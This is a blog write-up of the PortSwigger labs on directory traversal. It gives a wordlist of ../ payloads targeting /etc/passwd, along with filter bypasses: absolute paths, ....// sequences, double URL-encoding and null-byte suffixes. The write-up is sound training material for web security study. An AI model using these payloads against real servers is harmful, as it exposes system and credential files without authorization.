---
date: 2021-06-29 23:48:05
layout: post
title: Directory Traversal Vulnerabilities
subtitle: PortSwigger Writeup.
description: >-
  in this blog i've explained how to Directory Traversal Vulnerabilities and labs in PortSwigger
image: https://raw.githubusercontent.com/H3X0S3/h3x0s3.github.io/9d998b3f95ea806a4aa2073ee29b4cd2f8c97f6a/assets/img/Directory-traversal/directory-traversal.svg
optimized_image: https://raw.githubusercontent.com/H3X0S3/h3x0s3.github.io/9d998b3f95ea806a4aa2073ee29b4cd2f8c97f6a/assets/img/Directory-traversal/directory-traversal.svg
category: PortSwigger
tags:
  - PortSwigger
  - injection
author: Mahmoud S. Atia
paginate: true
---




![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/a501f51198723ff4fc8affcf4efebd531850b85d/assets/img/Directory-traversal/directory-traversal.svg)

# What is directory traversal?

Directory traversal (also known as file path traversal) is a web security vulnerability that allows an attacker to read arbitrary files on the server that is running an application. This might include application code and data, credentials for back-end systems, and sensitive operating system files. In some cases, an attacker might be able to write to arbitrary files on the server, allowing them to modify application data or behavior, and ultimately take full control of the server.

------------

#  Note

The enumeration process is very important to know the os to use a custom payload for it.

- Payload Wordlist

1. ../etc/passwd
2. ../../etc/passwd
3. ../../../etc/passwd
4. ../../../../etc/passwd
5. ../../../../../etc/passwd
6. ../../../../../../etc/passwd
7. ../../../../../../../etc/passwd
8. ../../../../../../../../etc/passwd
9. ../../../../../../../../../etc/passwd
10. ../../../../../../../../../../etc/passwd
11. ../../../../../../../../../../../etc/passwd
12. ../../../../../../../../../../../../etc/passwd
13. ../../../../../../../../../../../../../etc/passwd
14. ../../../../../../../../../../../../../../etc/passwd
15. ../../../../../../../../../../../../../../../../etc/passwd

In all  portswigger labs, to solve the lab, retrieve the contents of the
>/etc/passwd 

file so let's make our payloads list. If there any validation we will try to bypass it.

At first open **burpsuite**

# Lab: File path traversal, simple case

Access the lab. To solve the lab we should retrieve the content of /etc/passwd file. Open any image in new tab and see the url

>https://ac6d1f8d1e83342b80f310b9001f00b4.web-security-academy.net/image?filename=16.jpg

We will try to inject th payload after filename= so inercept the requst then send to intruder match the image name and take our wordlsit then past in payload options [simple lsit]. start attack

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Directory-traversal/simple-case.png)

labe solved

- Note: in Linux serve if If the number " ../"  is large, it won't change the output [result].

------------

# Lab: File path traversal, traversal sequences blocked with absolute path bypass
Access the lab.
As we did in Lab: File path traversal, simple case but sent the request to repeater delete file name and try to inject 
simple payload 
>/etc/passwd

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Directory-traversal/File-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass.png)

labe solved

------------

# Lab: File path traversal, traversal sequences stripped non-recursively

- Note:  The application strips path traversal sequences from the user-supplied filename before using it

So we will try to bypass this validation. we will try to bypass it by replace 
>../../

by
>....//
>....\/

So our payload format  will be as

>....//etc/passwd
>....\/etc/passwd

So replace ../../ at the prefix of our payload and make the wordlist. Past in payload options [simple lsit] then start attack

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Directory-traversal/File-path-traversal-traversal-sequences-stripped-non-recursively.png)

 Lab Solved

------------

# Lab: File path traversal, traversal sequences stripped with superfluous URL-decode

Access the lab. As we did in Lab: File path traversal, simple case but sent the intruder past in payload options [simple lsit]

Go to payload processing and add 2 URL-encode all characters 

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Directory-traversal/File-path-traversal-traversal-sequences-stripped-with%20superfluous-URL-decode-1.png)

start attack

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Directory-traversal/File-path-traversal-traversal-sequences-stripped-with%20superfluous-URL-decode-2.png)

 Lab Solved

------------

# Lab: File path traversal, validation of start of path

let's open any image in the new tab. See the URL

>https://ac5d1ff91ffa42cb80f3178300bb0085.web-security-academy.net/image?filename=/var/www/images/54.jpg

This the path to save images
>/var/www/images/

to to read passwd file we shoud go back  3 stip by ../
>../../../etc/passwd

so the URL

>https://ac5d1ff91ffa42cb80f3178300bb0085.web-security-academy.net/image?filename=/var/www/images/../../../etc/passwd

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Directory-traversal/File-path-traversal-validation-of-start-of-path.png)

 Lab Solved

------------

# Lab: File path traversal, validation of file extension with null byte bypass

As in the name of the lab [validation of file extension with null byte bypass]

our payloads should contain null bytes to bypass the validation 

|Decimal| 0  |
| ------------ | ------------ |
| Character  |  NUL(null character) |
|URL Encoding (UTF-8)   |   %00|

The application validates that the supplied filename ends with the expected file extension.

so the payloads should contain the name of the file [in our case image name ]at the end

so payload format should be as

../../../ect/passwd%00.ImageName.png

Go to Payload Processing add suffix %00.


![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Directory-traversal/File-path-traversal-validation-of-file-extension-with-null-byte-bypass-1.png)


start attack

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Directory-traversal/File-path-traversal-validation-of-file-extension-with-null-byte-bypass-2.png)

 Lab Solved

# All portswigger Directory traversal labs solved

![](https://media.tenor.co/images/64bf3b5260e5e0612038f89b3acb54d7/tenor.gif)
